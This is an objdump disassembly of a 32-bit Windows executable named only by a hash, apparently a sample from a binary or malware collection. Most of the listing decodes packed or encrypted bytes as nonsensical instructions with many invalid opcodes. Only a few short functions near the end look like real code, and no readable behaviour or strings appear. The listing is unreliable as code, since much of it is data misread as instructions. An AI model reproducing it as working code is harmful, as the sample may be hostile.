
278e64142df7b133305e24e96b8f9d891ec4588dd44e0152f40095701374f7a1.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	xor    ebx,DWORD PTR [esp+ecx*4-0x3d]
  4d0004:	aam    0xc2
  4d0006:	imul   eax,DWORD PTR [edx+0x63],0x56
  4d000a:	sub    eax,0xc9d037f1
  4d000f:	repnz outs dx,DWORD PTR ds:[esi]
  4d0011:	push   es
  4d0012:	(bad)  
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0663
  4d06c1:	rcl    esp,cl
  4d06c3:	or     BYTE PTR [ebp+0x48],bh
  4d06c6:	into   
  4d06c7:	aad    0x9b
  4d06c9:	sbb    ecx,DWORD PTR [edi-0x518eb034]
  4d06cf:	mov    ?,eax
  4d06d1:	mov    dl,0xe1
  4d06d3:	int3   
  4d06d4:	xor    DWORD PTR [edi-0x2577668c],0x4e
  4d06db:	(bad)  
  4d06dc:	xor    cl,BYTE PTR [edx]
  4d06de:	fmul   DWORD PTR ds:0xbc42ba1f
  4d06e4:	mul    BYTE PTR ds:[esi+edi*4-0x6]
  4d06e9:	jo     0x4d06ca
  4d06eb:	into   
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x50
  4d06f4:	mov    edi,0x4d30b4
  4d06f9:	add    edx,DWORD PTR [edi-0x54]
  4d06fc:	push   edi
  4d06fd:	mov    eax,0x0
  4d0702:	push   eax
  4d0703:	call   0x4d08c8
  4d0708:	add    esp,0x4
  4d070b:	pop    edi
  4d070c:	push   edi
  4d070d:	push   ecx
  4d070e:	push   esi
  4d070f:	push   esi
  4d0710:	call   0x4d0a08
  4d0715:	add    esp,0xc
  4d0718:	pop    edi
  4d0719:	push   edi
  4d071a:	mov    edi,0x0
  4d071f:	push   edi
  4d0720:	call   0x4d12ec
  4d0725:	add    esp,0x4
  4d0728:	pop    edi
  4d0729:	add    esp,0x50
  4d072c:	pop    ebp
  4d072d:	ret    
  4d072e:	add    BYTE PTR [eax],al
  4d0730:	mov    edi,edi
  4d0732:	push   ebp
  4d0733:	mov    ebp,esp
  4d0735:	sub    esp,0x30
  4d0738:	lea    esi,ds:0x4d31e4
  4d073e:	or     edi,0xffffffe4
  4d0741:	push   esi
  4d0742:	push   edx
  4d0743:	push   ebx
  4d0744:	push   ecx
  4d0745:	call   0x4d11f4
  4d074a:	add    esp,0xc
  4d074d:	pop    esi
  4d074e:	mov    ebx,0x0
  4d0753:	push   ebx
  4d0754:	call   0x4d0e18
  4d0759:	add    esp,0x4
  4d075c:	call   0x4d0c6c
  4d0761:	add    esp,0x4
  4d0764:	add    esp,0x30
  4d0767:	pop    ebp
  4d0768:	ret    
  4d0769:	add    BYTE PTR [eax],al
  4d076b:	add    BYTE PTR [edi-0x1],bl
  4d076e:	adc    eax,0x4d209c
  4d0773:	call   edi
  4d0775:	add    BYTE PTR [eax],al
  4d0777:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d077d:	sub    esp,0x44
  4d0780:	lea    edi,[ebx+0x24]
  4d0783:	xor    edx,0xffffffc6
  4d0786:	push   edi
  4d0787:	mov    edx,0x0
  4d078c:	push   edx
  4d078d:	call   0x4d0a90
  4d0792:	add    esp,0x4
  4d0795:	pop    edi
  4d0796:	push   edi
  4d0797:	push   edx
  4d0798:	push   edx
